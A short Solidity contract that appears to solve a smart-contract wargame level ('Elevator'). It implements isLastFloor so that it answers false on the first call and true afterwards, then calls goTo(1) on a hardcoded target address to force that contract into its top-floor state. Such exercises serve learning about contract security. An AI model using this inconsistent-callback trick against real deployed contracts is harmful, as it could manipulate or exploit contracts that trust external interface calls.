// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ElevatorSolution {
  bool public calledBefore = false;

  function isLastFloor(uint floor) external returns (bool) {
    // This will ensure this method returns 2 different values:
    if (calledBefore == false) {
      calledBefore = true;
      return false;
    }
    return true;
  }

  function callElevator() external {
    address elevatorAddress = 0x7218FdB09307A90667f42de9EA6279fB634F3B65;
    bytes memory payload = abi.encodeWithSignature("goTo(uint256)", 1);
    (bool success, ) = elevatorAddress.call(payload);
    require(success);
  }
}
